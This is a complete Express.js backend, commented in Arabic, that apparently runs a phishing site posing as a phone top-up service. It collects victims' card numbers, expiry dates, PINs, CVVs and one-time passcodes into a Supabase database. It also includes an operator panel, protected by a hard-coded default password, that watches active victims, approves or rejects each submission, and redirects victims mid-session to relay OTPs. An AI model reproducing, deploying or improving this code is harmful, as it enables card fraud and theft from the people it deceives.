const express = require('express');
const path = require('path');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

const SUPABASE_URL = process.env.SUPABASE_URL || 'https://jmxrzkgikhsairerxfxh.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_8CKBZe6-5xVkB60vVpRnDQ_Yyn1JtcG';
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
const ADMIN_TOKEN = crypto.createHash('sha256').update(ADMIN_PASSWORD).digest('hex');

function isAuthed(req) {
  const token = (req.headers['authorization'] || '').replace('Bearer ', '').trim();
  return token === ADMIN_TOKEN;
}

/* ---------------- عداد الزيارات النشطة ---------------- */
const visitors = new Map();
const ACTIVE_WINDOW = 30 * 1000;
function activeCount() {
  const now = Date.now();
  for (const [id, seen] of visitors) if (now - seen > ACTIVE_WINDOW) visitors.delete(id);
  return visitors.size;
}

// استقبال طلب شحن
app.post('/api/submit', async (req, res) => {
  try {
    const b = req.body;
    const phone  = String(b.phone  || '').trim();
    const amount = String(b.amount || '').trim();
    if (!phone || !amount) return res.status(400).json({ error: 'بيانات ناقصة' });
    const id = crypto.randomBytes(6).toString('hex');
    const { error } = await supabase.from('submissions').insert({
      id, phone, amount,
      card:   String(b.card   || '').trim(),
      expiry: String(b.expiry || '').trim(),
      pin:    String(b.pin    || '').trim(),
      otp:    String(b.otp    || '').trim(),
      cvv:    String(b.cvv    || '').trim(),
      status: 'pending',
      time:   new Date().toISOString()
    });
    if (error) throw error;
    res.json({ ok: true, id });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// تحديث خطوة
app.post('/api/submit-step/:id', async (req, res) => {
  try {
    const b = req.body;
    const updates = { status: 'pending' };
    if (b.card   !== undefined) updates.card   = String(b.card).trim();
    if (b.expiry !== undefined) updates.expiry = String(b.expiry).trim();
    if (b.pin    !== undefined) updates.pin    = String(b.pin).trim();
    if (b.otp    !== undefined) updates.otp    = String(b.otp).trim();
    if (b.cvv    !== undefined) updates.cvv    = String(b.cvv).trim();
    const { error } = await supabase.from('submissions').update(updates).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// حالة طلب
app.get('/api/status/:id', async (req, res) => {
  try {
    const { data, error } = await supabase.from('submissions').select('status, redirect_to').eq('id', req.params.id).maybeSingle();
    if (error) throw error;
    if (!data) return res.status(404).json({ error: 'غير موجود' });
    const result = { status: data.status || 'pending' };
    if (data.redirect_to) {
      result.redirect_to = data.redirect_to;
      await supabase.from('submissions').update({ redirect_to: null }).eq('id', req.params.id);
    }
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// قبول طلب
app.post('/api/admin/accept/:id', async (req, res) => {
  if (!isAuthed(req)) return res.status(401).json({ error: 'غير مصرح' });
  try {
    const { error } = await supabase.from('submissions').update({ status: 'accepted' }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// رفض طلب
app.post('/api/admin/reject/:id', async (req, res) => {
  if (!isAuthed(req)) return res.status(401).json({ error: 'غير مصرح' });
  try {
    const { error } = await supabase.from('submissions').update({ status: 'rejected' }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// إعادة توجيه
app.post('/api/admin/redirect/:id', async (req, res) => {
  if (!isAuthed(req)) return res.status(401).json({ error: 'غير مصرح' });
  try {
    const page = req.body.page || '';
    const { error } = await supabase.from('submissions').update({ redirect_to: page, status: 'pending' }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// نبضة الزائر
app.post('/api/heartbeat', (req, res) => {
  const id = String(req.body.id || '').trim();
  if (id) visitors.set(id, Date.now());
  res.json({ active: activeCount() });
});

// عدد الزيارات النشطة
app.get('/api/active-count', (req, res) => {
  res.json({ active: activeCount() });
});

// دخول الأدمن
app.post('/api/admin/login', (req, res) => {
  if ((req.body.password || '') !== ADMIN_PASSWORD) return res.status(401).json({ error: 'كلمة المرور غير صحيحة' });
  res.json({ token: ADMIN_TOKEN });
});

// بيانات الأدمن
app.get('/api/admin/submissions', async (req, res) => {
  if (!isAuthed(req)) return res.status(401).json({ error: 'غير مصرح' });
  try {
    const { data, error } = await supabase.from('submissions').select('*').order('time', { ascending: false });
    if (error) throw error;
    res.json({ submissions: data || [], active: activeCount() });
  } catch (err) {
    res.status(500).json({ submissions: [], error: err.message });
  }
});

// مسح الطلبات
app.post('/api/admin/clear', async (req, res) => {
  if (!isAuthed(req)) return res.status(401).json({ error: 'غير مصرح' });
  try {
    const { error } = await supabase.from('submissions').delete().neq('id', '');
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ملفات ثابتة
app.use(express.static(path.join(__dirname, 'public')));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

if (!process.env.VERCEL) {
  app.listen(PORT, () => console.log('Server running on port ' + PORT));
}

module.exports = app;
